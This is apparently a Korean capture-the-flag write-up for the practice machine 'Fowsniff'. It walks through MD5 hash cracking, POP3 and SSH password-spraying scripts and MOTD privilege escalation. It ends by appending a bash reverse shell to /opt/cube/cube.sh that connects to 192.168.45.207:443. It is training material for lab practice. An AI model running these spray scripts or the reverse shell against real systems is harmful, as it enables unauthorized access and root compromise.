---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/enum/dirbust
  - tech/enum/osint
  - tech/cred/crack
  - tech/cred/spray
  - tech/cred/reuse
  - tech/svc/pop3
  - tech/lin/motd
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.18
ports: [22, 80, 110, 143]
services: [http, imap, pop3, ssh]
status: solved
manual_tags: true
manual_cves: true
tech_count: 8
---

> [!info] 요약
> PG Practice · Fowsniff · Fundamental · Ubuntu 16.04 · 플래그 2개
> 유출 해시 덤프(OSINT) → MD5 크랙 → POP3 스프레이(`seina`) → 메일 본문의 SSH 임시 비번 → SSH(`baksteen`) → `users` 그룹이 쓸 수 있는 `/opt/cube/cube.sh` 가 SSH 로그인 때 root 로 실행 → root
> `local.txt` = `/home/baksteen/local.txt` · `proof.txt` = `/root/proof.txt`
> 아래 플래그 값은 **2026-08-20 인스턴스** 기준. PG 는 박스를 다시 켤 때마다 값을 새로 만든다.

## 0. 이 박스에서 배우는 것

- **메일 서비스(110/143)를 자격증명 저장소로 본다.** POP3 는 셸이 아니라 *다음 자격증명이 평문으로 적혀 있는 곳*이다.
- **자격증명 재사용 체인** — 유출 덤프 → 메일 → SSH. 각 단계에서 살아남는 계정이 하나씩만 바뀐다.
- **보조 그룹 하나가 권한상승 경로다.** `gid=100(users)` 를 보고 `find / -group users -writable` 를 치는 반사.
- **MOTD 권한상승** — `/etc/update-motd.d/` 하위 스크립트가 SSH 로그인마다 root 로 실행된다. 다만 **실행 주체는 릴리스마다 다르다** — 이 박스는 pam_motd 가 아니라 sshd 였고, 그걸 `/proc` 으로 확인하는 절차가 4장이다.
- **Dovecot 은 실패한 IP 에 사전 지연을 건다.** 스프레이 스크립트의 소켓 타임아웃이 방화벽 차단처럼 보이는 함정.

**시험 출제 가능성** — MOTD 경로는 Ubuntu 박스에서 실제로 자주 나온다. 변형은 `/etc/update-motd.d/` 자체가 그룹 쓰기 가능하거나, `00-header` 가 `/opt`·`/usr/local/bin` 아래 스크립트를 부르고 그 스크립트가 헐거운 형태다. POP3/IMAP 이 열려 있는데 웹이 막다른 길이면 메일함부터 뒤지는 것도 그대로 전이된다.

## 1. 정찰

### Nmap

먼저 top-200 으로 방향만 잡았다 (`quick.log`, 7.9초):

```
# Nmap 7.98 scan initiated Thu Aug 20 14:53:46 2026 as: /usr/lib/nmap/nmap --privileged -sV -Pn --top-ports 200 --min-rate 3000 -oN quick.log 192.168.248.18
Nmap scan report for 192.168.248.18
Host is up (0.087s latency).
Not shown: 196 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3    Dovecot pop3d
143/tcp open  imap    Dovecot imapd
# Nmap done at Thu Aug 20 14:53:54 2026 -- 1 IP address (1 host up) scanned in 7.90 seconds
```

동시에 전포트 (`nmap.log`). OS 지문 블록만 접었고 나머지는 원문이다.

```
$ nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.18

# Nmap 7.98 scan initiated Thu Aug 20 14:53:37 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.18
Nmap scan report for 192.168.248.18
Host is up (0.084s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Fowsniff Corp - Delivering Solutions
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: CAPA AUTH-RESP-CODE PIPELINING UIDL RESP-CODES TOP USER SASL(PLAIN)
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: OK SASL-IR AUTH=PLAINA0001 post-login have more capabilities listed ENABLE Pre-login LITERAL+ IMAP4rev1 LOGIN-REFERRALS IDLE ID
No exact OS matches for host (...)
[TCP/IP fingerprint 블록 생략]
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
# Nmap done at Thu Aug 20 14:54:18 2026 -- 1 IP address (1 host up) scanned in 41.12 seconds
```

두 줄이 방향을 정한다.

`pop3-capabilities` 의 **`USER`** — Dovecot 이 평문 `USER`/`PASS` 를 받는다는 뜻이다. 이게 없으면 SASL 만 남아 스프레이 스크립트를 다르게 짜야 한다. `SASL(PLAIN)` 도 같이 있으니 평문 인증이 TLS 없이 허용돼 있다.

`OpenSSH 7.2p2 Ubuntu 4ubuntu2.4` + `Apache 2.4.18 (Ubuntu)` — Xenial(16.04) 조합이다. 나중에 `/etc/os-release` 로 확인했고 맞았다(`16.04.4 LTS (Xenial Xerus)`, 커널 `4.4.0-116-generic`). 배너 하나로 단정하지 않고 두 서비스가 같은 릴리스를 가리키는지 본다.

> [!note] `-p-` 가 여기서는 아무것도 더 주지 않았다
> top-200 이 7.9초에 22/80/110/143 을 전부 찾았고, 전포트 스캔 41초의 결과도 같은 4개였다(`quick.log` vs `nmap.full.txt`). `-p-` 는 여전히 기본기지만 **이 박스에서 그게 결정적이었다고 쓰면 거짓말**이 된다. 비용도 41초라 없었다.

### 웹 (80)

루트는 HTML5UP 의 "Escape Velocity" 템플릿을 그대로 얹은 정적 페이지다. 본문이 서사를 준다.

> Fowsniff's internal system suffered a data breach that resulted in the exposure of employee usernames and passwords.
>
> The attackers were also able to hijack our official **@fowsniffcorp** Twitter account.

여기가 이 박스의 유일한 진짜 힌트다. **자격증명은 박스 안이 아니라 밖에 있다.**

```
$ gobuster dir -u http://192.168.248.18/ \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x php,txt,html -t 40 -o gobuster.log

/images              (Status: 301) [Size: 317] [--> http://192.168.248.18/images/]
/index.html          (Status: 200) [Size: 2629]
/security.txt        (Status: 200) [Size: 459]
/assets              (Status: 301) [Size: 317] [--> http://192.168.248.18/assets/]
/README.txt          (Status: 200) [Size: 1288]
/robots.txt          (Status: 200) [Size: 26]
/LICENSE.txt         (Status: 200) [Size: 17128]
```

`README.txt` 와 `LICENSE.txt` 는 템플릿 원본 파일이다(`Escape Velocity by HTML5 UP / html5up.net | @ajlkn`). `robots.txt` 는 26바이트 — `User-agent: *` + `Disallow: /` 두 줄이면 정확히 26이다. `security.txt` 만 박스가 심어둔 것이고, 내용은 ASCII 아트 자랑이다.

```
$ curl -s http://192.168.248.18/security.txt

       WHAT SECURITY?
...
Fowsniff Corp got pwn3d by B1gN1nj4!

No one is safe from my 1337 skillz!
```

**동적 페이지가 하나도 없다.** PHP 도, 폼도, 파라미터도 없다. 웹은 서사 전달용이고 공격면이 아니다 — 이 판단을 15분 안에 내려야 한다.

### 유출 덤프 확보 (OSINT)

페이지가 지목한 `@fowsniffcorp` 계정에서 공격자가 pastebin 으로 덤프를 뿌렸다는 것이 원 시나리오다. 원본 paste(`pastebin.com/raw/NrAqVeeX`)는 지금 404 로 삭제돼 있어서 공개 미러에서 9쌍을 복원했다(`dump.txt`).

```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```

> [!warning] 이 박스는 타겟 밖 자료를 요구한다 — 시험에서는 안 나온다
> OSCP 시험 박스는 자기 완결적이다. 정찰로 얻을 수 없는 값을 인터넷에서 가져와야 하는 구성은 나오지 않는다. 이 단계는 **시험 반사로 훈련할 것이 아니라, 여기서 막혔을 때 "박스 안을 더 파는 게 아니라 밖을 봐야 한다"는 판단**만 가져가면 된다.
> 박스 안을 더 판 시간이 실제로 있었다(6장 참조).

## 2. 취약점 분석

취약점이라 부를 만한 것은 셋이고, 전부 설정·운영의 문제다.

1. **솔트 없는 MD5 로 저장된 비밀번호** — 덤프가 유출되는 순간 rockyou 로 초 단위에 풀린다.
2. **평문 임시 비밀번호를 메일 본문으로 전 직원에게 배포** — 메일함 하나만 뚫리면 SSH 가 열린다.
3. **`/opt/cube/cube.sh` 가 `users` 그룹 쓰기 가능** — 그리고 그 파일은 SSH 로그인 때 root 로 실행된다.

세 번째가 권한상승의 본체라 4장에서 자세히 본다.

### 왜 MD5 가 즉시 풀리는가

솔트가 없으므로 같은 평문은 항상 같은 해시다. 후보 단어 하나를 한 번 해싱해 9개 해시 전부와 비교할 수 있다 — 사전 단어당 비용이 계정 수와 무관하다. john 이 9개를 "no different salts" 로 로드했다고 알려주는 게 정확히 이 뜻이다.

```
$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

Loaded 9 password hashes with no different salts (Raw-MD5 [MD5 128/128 AVX 4x3])
scoobydoo2       (?)
orlando12        (?)
apples01         (?)
skyler22         (?)
mailcall         (?)
07011972         (?)
carp4ever        (?)
bilbo101         (?)
8g 0:00:00:00 DONE (2026-08-20 14:56) 9.411g/s 16874Kp/s 16874Kc/s 43155KC/s
```

9개 중 8개, 1초 미만. `stone` 만 rockyou 밖이다.

출력 순서는 크랙 난이도가 아니라 **rockyou 안의 행 순서**다 — wordlist 모드는 파일을 위에서 아래로 훑기 때문이다. 실제로 위 8개의 rockyou 행번호는 17577 / 81318 / 119135 / 166758 / 622357 / 2424341 / 9279098 / 9627898 로 출력 순서와 정확히 일치한다. 크랙 로그가 진짜인지 사후에 검산할 때 쓸 수 있는 성질이다.

`--format=raw-md5` 를 빼면 john 이 형식 자동판정에 들어가고, 32자 hex 는 raw-MD5·NTLM·LM 등 여러 형식과 모양이 같아 엉뚱한 형식을 고르거나 사용자에게 되묻는다. 아는 형식이면 명시하는 게 항상 빠르다.

**`--show` 는 평문만 뱉고 사용자와 짝지어 주지 않는다.** john 에 넣은 게 해시만 담긴 파일이라 그렇다 — `john_cracked.txt` 가 `?:mailcall` 처럼 사용자 자리가 `?` 로 남아 있는 게 그 증거다. 짝을 되살리려면 평문을 다시 해싱해 덤프와 대조한다.

```
$ python3 - <<'EOF'
import hashlib
plains=['mailcall','bilbo101','apples01','skyler22','scoobydoo2','carp4ever','orlando12','07011972']
m={hashlib.md5(p.encode()).hexdigest():p for p in plains}
for line in open('dump.txt'):
    u,h=line.strip().split(':'); u=u.split('@')[0]
    print(f'{u}:{m.get(h,"<UNCRACKED>")}')
EOF

mauer:mailcall
mustikka:bilbo101
tegel:apples01
baksteen:skyler22
seina:scoobydoo2
stone:<UNCRACKED>
mursten:carp4ever
parede:orlando12
sciana:07011972
```

`user:hash` 형식 파일을 그대로 john 에 주고 `--show` 를 쓰면 john 이 짝을 유지해 준다. 위처럼 해시만 잘라 넣었으면 이 재조합 단계가 필요하다.

## 3. Foothold

### POP3 스프레이

`USER`/`PASS` 를 순서대로 보내고 두 번째 응답만 보면 된다. 성공은 `+OK`, 실패는 `-ERR [AUTH] Authentication failed.`

디스크에 남은 `pop3spray.py` 원문이다 — 타임아웃을 고친 뒤의 최종본이라 `40` 과 `sleep(3)` 이 들어 있다.

```python
#!/usr/bin/env python3
import socket, sys
HOST='192.168.248.18'; PORT=110
def rd(s):
    d=b''
    while not d.endswith(b'\r\n'): d+=s.recv(4096)
    return d.decode(errors='replace').strip()
import time
for line in open('creds.txt'):
    u,p=line.strip().split(':',1)
    if p.startswith('<'): continue
    s=socket.create_connection((HOST,PORT),40); rd(s)
    s.sendall(f'USER {u}\r\n'.encode()); r1=rd(s)
    s.sendall(f'PASS {p}\r\n'.encode()); r2=rd(s)
    print(f'{u:10} {p:12} -> {r2}')
    try: s.sendall(b'QUIT\r\n'); s.close()
    except: pass
    time.sleep(3)
```

`create_connection` 의 세 번째 인자가 소켓 타임아웃이다. 처음엔 8초로 짰다가 세 번째 계정에서 죽었다 — 원인과 정확한 수치는 6장에.

`if p.startswith('<'): continue` 는 `creds.txt` 의 `stone:<UNCRACKED>` 를 건너뛴다. 안 풀린 계정을 그대로 쏘면 실패 카운트만 하나 더 쌓인다.

```
$ python3 pop3spray.py            # try2_pop3spray.log

mauer      mailcall     -> -ERR [AUTH] Authentication failed.
mustikka   bilbo101     -> -ERR [AUTH] Authentication failed.
tegel      apples01     -> -ERR [AUTH] Authentication failed.
baksteen   skyler22     -> -ERR [AUTH] Authentication failed.
seina      scoobydoo2   -> +OK Logged in.
mursten    carp4ever    -> -ERR [AUTH] Authentication failed.
parede     orlando12    -> -ERR [AUTH] Authentication failed.
sciana     07011972     -> -ERR [AUTH] Authentication failed.
```

8명 중 `seina` 하나. 나머지는 유출 이후 비번을 바꿨다 — 시나리오상 그게 자연스럽고, 실제로 왜 `seina` 만 안 바꿨는지는 메일함에 답이 있다.

도구 없이도 되는지는 netcat 으로 확인한다. 아래 응답 줄은 `mail_seina.txt` 에 남은 것과 같다 — 대화형 세션 자체는 스크롤백뿐이라 로그 파일로 남기지 않았다.

```
$ nc 192.168.248.18 110
+OK Welcome to the Fowsniff Corporate Mail Server!
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
```

### 메일함 읽기

POP3 는 명령 4개면 끝난다. `LIST` 로 번호와 크기, `RETR <n>` 으로 본문.

```
$ (printf 'USER seina\r\nPASS scoobydoo2\r\nLIST\r\n'; sleep 4; \
   printf 'RETR 1\r\n'; sleep 3; printf 'RETR 2\r\n'; sleep 3; \
   printf 'QUIT\r\n'; sleep 2) | nc 192.168.248.18 110

+OK Welcome to the Fowsniff Corporate Mail Server!
+OK
+OK Logged in.
+OK 2 messages:
1 1622
2 1280
```

응답이 넷인 이유 — 배너, `USER` 에 대한 `+OK`, `PASS` 에 대한 `+OK Logged in.`, 그리고 `LIST` 결과다. `USER` 응답이 그냥 `+OK` 라는 것은 **그 계정이 있든 없든 같다**는 뜻이라 사용자 열거에는 못 쓴다.

`sleep` 이 필요한 이유 — 파이프로 몰아넣으면 클라이언트가 서버 응답을 기다리지 않고 전부 밀어버린다. POP3 는 파이프라이닝을 지원하지만 `nc` 는 응답을 다 받기 전에 EOF 로 연결을 닫아 출력이 잘린다. 각 단계 사이에 `sleep` 을 끼워 응답을 받아낸다.

1번 메일 — `stone@fowsniff`, 제목 `URGENT! Security EVENT!` (헤더 일부·인사말 생략):

```
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

...
This server is capable of sending and receiving emails, but only
locally. ... You can, however, access this system via
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance.
```

수신자 8명 전원이 후보다. 2번 메일이 그중 누구인지를 좁혀준다 — `baksteen` 이 `seina` 에게 보낸 잡담이다:

```
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.
```

**`baksteen` 은 stone 의 메일을 아직 안 읽었다 = 임시 비번을 안 바꿨다.** 이게 정답 계정이라는 강한 신호다. 다만 신호를 믿고 하나만 찔러볼 이유는 없다 — 8명 전부 돌린다.

### SSH 스프레이

```bash
for u in $(cat users.txt); do
  r=$(sshpass -p 'S1ck3nBluff+secureshell' ssh -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 \
        -o PreferredAuthentications=password -o PubkeyAuthentication=no \
        $u@192.168.248.18 'id' 2>&1 | tr '\n' ' ')
  echo "$u => $r"
done
```

`-o PreferredAuthentications=password -o PubkeyAuthentication=no` 를 붙이는 이유 — 이걸 빼면 Kali 의 `~/.ssh/id_*` 를 먼저 시도한다. 서버 기본값 `MaxAuthTries 6` 안에서 키 시도가 자리를 먹으면 비밀번호가 닿기 전에 연결이 끊길 수 있고, 실패 원인도 헷갈린다. 스프레이할 때는 인증 방식을 하나로 고정한다.

`-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null` 은 한 쌍으로 쓴다. `StrictHostKeyChecking=no` 만으로는 **키가 바뀌었을 때** 막히는 것을 못 푼다 — PG 는 리버트마다 호스트키가 새로 생기고, 그때 `REMOTE HOST IDENTIFICATION HAS CHANGED` 가 뜨면 비밀번호 인증 자체가 거부된다. `/dev/null` 을 물리면 매 연결이 빈 `known_hosts` 로 시작해 그 상태가 아예 생기지 않고, 내 `known_hosts` 도 더럽히지 않는다. 대가는 아래처럼 **매 연결마다 경고가 출력에 섞이는 것**이다.

`try3_ssh_spray.log` 원문. 첫 줄만 전문이고 나머지는 같은 경고가 반복되므로 접었다.

```
mauer => Warning: Permanently added '192.168.248.18' (ED25519) to the list of known hosts. ** WARNING: connection is not using a post-quantum key exchange algorithm. ** This session may be vulnerable to "store now, decrypt later" attacks. ** The server may need to be upgraded. See https://openssh.com/pq.html Permission denied, please try again.
mustikka => [동일 경고] Permission denied, please try again.
tegel    => [동일 경고] Permission denied, please try again.
baksteen => [동일 경고] uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
seina    => [동일 경고] Permission denied, please try again.
stone    => [동일 경고] Permission denied, please try again.
mursten  => [동일 경고] Permission denied, please try again.
parede   => [동일 경고] Permission denied, please try again.
sciana   => [동일 경고] Permission denied, please try again.
```

`2>&1 | tr '\n' ' '` 로 한 줄로 눌러놨기 때문에 경고와 결과가 같은 줄에 붙는다. 스프레이 결과를 눈으로 훑을 거라면 `grep -o 'uid=[^ ]*'` 같은 걸 뒤에 붙이는 게 낫다 — 경고 문구가 길어서 성공 한 줄이 묻힌다.

`baksteen` 으로 대화형 SSH 셸. 메일 본문이 예측한 그대로다.

## 4. 권한상승

### 셸 잡자마자 친 것

`enum_baksteen.log` 원문. 구분자(`---SUID` 등)는 내가 `echo` 로 끼운 것이다.

```
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
---SUDO
[sudo] password for baksteen: SoConnection to 192.168.248.18 closed.
 fowsniff.
---SUID
/bin/mount
/bin/fusermount
/bin/umount
/bin/ping
/bin/su
/bin/ntfs-3g
/bin/ping6
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/procmail
/usr/bin/sudo
/usr/bin/chsh
---CAP
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
---CRON
no crontab for baksteen
..
# /etc/crontab: system-wide crontab
...
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
---OS
NAME="Ubuntu"
VERSION="16.04.4 LTS (Xenial Xerus)"
ID=ubuntu
Linux fowsniff 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

> [!warning] `---SUDO` 줄이 왜 저렇게 깨졌나 — 실제 출력이고 다듬지 않았다
> 친 명령은 `echo '<pw>' | sudo -S -l` 이다. `-S` 는 비밀번호를 stdin 에서 읽지만 **프롬프트는 stderr 로 그대로 뿌린다.** 여기에 `ssh -tt` 로 강제한 의사터미널의 출력과 로컬 리다이렉션이 겹치면서 `Sorry, user baksteen may not run sudo on fowsniff.` 가 `So` … `Connection to ... closed.` … ` fowsniff.` 로 토막나 섞였다.
> 결론 자체는 바뀌지 않는다 — **sudo 권한 없음.** 다만 배치 열거 로그가 이렇게 섞이면 나중에 읽을 때 "안 돌았나" 싶어진다. `sudo -n -l 2>/dev/null` 로 stderr 를 버리는 편이 로그가 깨끗하다.

SUID 목록은 Ubuntu 16.04 기본값 그대로다. `/usr/bin/procmail` 이 눈에 걸리지만 메일 서버라서 있는 것이고 표준 패키지 SUID 다. `getcap` 결과도 전부 배포판 기본. `/etc/crontab` 은 배포판 원본 4줄(`run-parts` hourly/daily/weekly/monthly)뿐이고 `/etc/cron.d/` 에는 `popularity-contest` 만 있다. cron 없음, sudo 없음.

**여기서 막히면 그룹을 본다.**

### `gid=100(users)` 가 단서다

`baksteen` 의 기본 그룹이 자기 이름 그룹이 아니라 `users` 다.

```
$ grep -E 'baksteen|parede|stone' /etc/passwd
stone:x:1000:1000:stone,,,:/home/stone:/bin/bash
parede:x:1001:100::/home/parede:/bin/bash
baksteen:x:1004:100::/home/baksteen:/bin/bash
```

여러 계정이 `users`(gid 100)를 공유한다. 공유 그룹은 그 자체로 냄새다 — 관리자가 "이 파일들은 직원 전부가 만질 수 있게" 라고 생각한 흔적이고, 그 안에 실행되는 스크립트가 섞여 있으면 그게 권한상승이다.

```
$ find / -group users -writable -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null

/opt/cube/cube.sh
/run/user/1004
/run/user/1004/systemd
...
/home/baksteen/.cache
/home/baksteen/Maildir
...
/home/baksteen/.bashrc
```

홈과 런타임 디렉터리를 빼면 **`/opt/cube/cube.sh` 하나**다. 이 필터가 핵심이다 — 자기 홈은 당연히 쓸 수 있으니 결과의 90%가 소음이고, `/opt`·`/usr/local`·`/srv`·`/var` 로 눈을 먼저 던져야 한다.

```
$ ls -la /opt/cube/
drwxrwxrwx 2 root   root  4096 Feb 28  2020 .
-rw-rwxr-- 1 parede users  850 Feb 28  2020 cube.sh
```

*(이 `ls` 출력은 로그 파일로 저장되지 않았다. 당시 기록에 남은 것은 `-rw-rwxr-- parede:users` 와 850바이트이고, 그 둘은 백업본 `cube.sh.orig` 로 재확인된다. 디렉터리 모드 `777` 은 박스가 내려간 뒤라 재확인할 수 없다.)*

모드가 `674` 다. 소유자 `parede` 는 실행조차 못 하는데 그룹 `users` 는 `rwx` 다 — 손으로 잘못 준 권한의 전형적인 모양.

### 왜 이게 root 가 되는가

파일 내용은 회사 로고 ASCII 아트를 `printf` 하는 것뿐이다. 셔뱅도 없다 — 그래서 호출하는 쪽이 `sh` 를 명시한다. 중요한 건 **누가 이걸 부르는가**다.

```
$ cat /etc/update-motd.d/00-header
#!/bin/sh
#
#    00-header - create the header of the MOTD
...
#printf "Welcome to %s (%s %s %s)\n" ...

sh /opt/cube/cube.sh
```

*(이 `cat` 출력도 파일로 저장되지 않았다. `enum2_writable.log` 는 `00-header` 가 `root:root 755`·1248바이트라는 것까지만 남겼고, "`sh /opt/cube/cube.sh` 를 호출한다"는 당시 시간순 기록에 있다.)*

원본 Canonical 스크립트의 `printf` 줄이 주석 처리되고 **맨 아래에 `sh /opt/cube/cube.sh` 가 추가**돼 있다. `00-header` 자체는 손댈 수 없지만, 그게 부르는 파일은 우리 것이다.

여기서 흔히 "pam_motd 가 root 로 실행한다"고 넘어가는데, 이 박스의 PAM 설정은 그렇게 돼 있지 않다. `enum3_motd_mechanism.log` 원문:

```
$ grep -n motd /etc/pam.d/sshd
31:# This includes a dynamically generated part from /run/motd.dynamic
32:# and a static (admin-editable) part from /etc/motd.
33:session    optional     pam_motd.so  motd=/run/motd.dynamic
34:session    optional     pam_motd.so noupdate

$ grep -iE 'printmotd|usepam' /etc/ssh/sshd_config
PrintMotd no
UsePAM yes
```

주석 두 줄이 답을 반쯤 준다 — pam 은 **이미 만들어져 있는** `/run/motd.dynamic` 을 출력만 하고, `noupdate` 는 update-motd.d 를 실행하지 말라는 뜻이다. 그럼 누가 만드나.

### `/proc` 으로 조상을 거슬러 올라간다 — 이 절차가 이 박스의 핵심

추측하지 않고 `cube.sh` 안에 프로브를 심어 **자기 자신의 부모를 따라 올라간다.** 프로브는 두 번 보냈다.

1차 — 자기 자신과 부모만 확인:

```
uid=0(root) gid=0(root) groups=0(root)
  PID  PPID USER     COMMAND
 1852  1851 root     sh /opt/cube/cube.sh
  PID  PPID USER     COMMAND
 1851  1850 root     /bin/sh /etc/update-motd.d/00-header
```

첫 줄로 이미 확정된다 — **`cube.sh` 는 uid 0 으로 돈다.** 그리고 부모가 `00-header` 다. 하지만 `00-header` 위가 안 보인다.

2차 — `/proc/<pid>/stat` 의 4번째 필드(ppid)를 따라 루트까지 훑고, 각 pid 의 `/proc/<pid>/cmdline` 을 찍는다. `enum4_motd_parent.log` 원문:

```
sh/opt/cube/cube.sh [pid 1882]
/bin/sh/etc/update-motd.d/00-header [pid 1881]
run-parts--lsbsysinit/etc/update-motd.d [pid 1880]
sh-c/usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin
:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new [pid 187
9]
sshd: baksteen [priv] [pid 1876]
/usr/sbin/sshd-D [pid 709]
```

> [!warning] 붙어 있는 단어들은 오타가 아니다 — `/proc/<pid>/cmdline` 은 NUL 구분이다
> `sh/opt/cube/cube.sh` 처럼 인자가 명령에 붙어 나온 것은 `tr -d '\0'` 으로 **NUL 을 지워버렸기** 때문이다. 공백으로 **바꿔야** 한다:
> ```sh
> tr '\0' ' ' < /proc/$pid/cmdline
> ```
> `sh -c ...` 항목만 중간에 공백이 살아 있는데, 그건 그 인자 하나가 원래 공백을 포함한 긴 문자열이라 그렇다. 시험장에서 `cmdline` 을 읽을 때 매번 걸리는 함정이라 여기 적어둔다. (`ps` 를 쓸 수 있으면 `ps -o pid,ppid,args -p <pid>` 가 더 편하지만, 프로브가 MOTD 안에서 도는 상황에서는 파일 읽기가 확실하다.)

`sshd: baksteen [priv]` — sshd 의 **특권 프로세스**(root)가 로그인마다 `sh -c '/usr/bin/env -i PATH=... run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new'` 를 돌려 `/run/motd.dynamic` 을 새로 만든다. Ubuntu 가 OpenSSH 에 넣은 패치이고, `PrintMotd no` 여도 이 생성은 돈다(출력은 pam_motd 가 한다). 그 체인 끝이 우리가 쓸 수 있는 `cube.sh` 다.

> [!tip] 일반화 — Ubuntu 박스에서 SSH 로그인이 되는데 sudo/SUID 가 비었을 때
> `ls -la /etc/update-motd.d/` 와 그 안의 스크립트들이 무엇을 부르는지 본다. 스크립트 자체가 root 소유여도, 그것이 부르는 대상이 쓰기 가능하면 끝이다. `grep -r . /etc/update-motd.d/` 로 외부 경로 호출을 한 번에 훑는 게 빠르다.
> **누가 실행하는지는 릴리스마다 다르다** — 이 박스는 sshd 패치였고 pam_motd 는 `noupdate` 였다. 그러니 "pam 이 돌린다"고 외우지 말고 `/proc` 으로 확인하는 절차를 외워라. 그 절차는 MOTD 말고도 "왜 이게 root 로 도는가"를 물어야 하는 모든 곳에 쓰인다.
> `/etc/profile.d/`·`~/.bashrc` 와 헷갈리지 말 것 — 그쪽은 **로그인하는 사용자 권한**으로 돌아 권한상승이 안 된다.

### 실행

원본을 먼저 백업한다. 정리를 위한 것이기도 하고, 아트가 깨지면 관리자가 눈치챈다.

```
$ sshpass -p '...' scp baksteen@192.168.248.18:/opt/cube/cube.sh ./cube.sh.orig
$ md5sum cube.sh.orig
377489e75ac90ece2f92fe30519f371c  cube.sh.orig
$ wc -c cube.sh.orig
850 cube.sh.orig
```

리스너를 tmux 안에 올린다. 비대화형 SSH 는 호출이 끝나면 자식을 죽이므로 tmux 가 아니면 리스너가 사라진다.

```
$ tmux new-session -d -s fow_root 'sudo nc -lvnp 443; exec bash'
$ ss -lntp | grep 443
LISTEN 0      1            0.0.0.0:443        0.0.0.0:*
```

프로세스 열(`users:(("nc",pid=...))`)이 안 보이는 건 정상이다 — `sudo` 로 띄운 root 소유 소켓이라 비특권 `ss` 에게는 소유 프로세스가 가려진다. 리스너가 정말 내 것인지 확인하려면 `sudo ss -lntp` 를 쓴다.

`cube.sh` 끝에 한 줄 덧붙인다. **덮어쓰지 않고 append** 하는 이유 — 아트 출력이 그대로 남아야 로그인 화면이 정상으로 보이고, 복원도 `truncate` 한 번이면 된다.

```
$ printf '\nbash -c "bash -i >& /dev/tcp/192.168.45.207/443 0>&1" &\n' >> /opt/cube/cube.sh
```

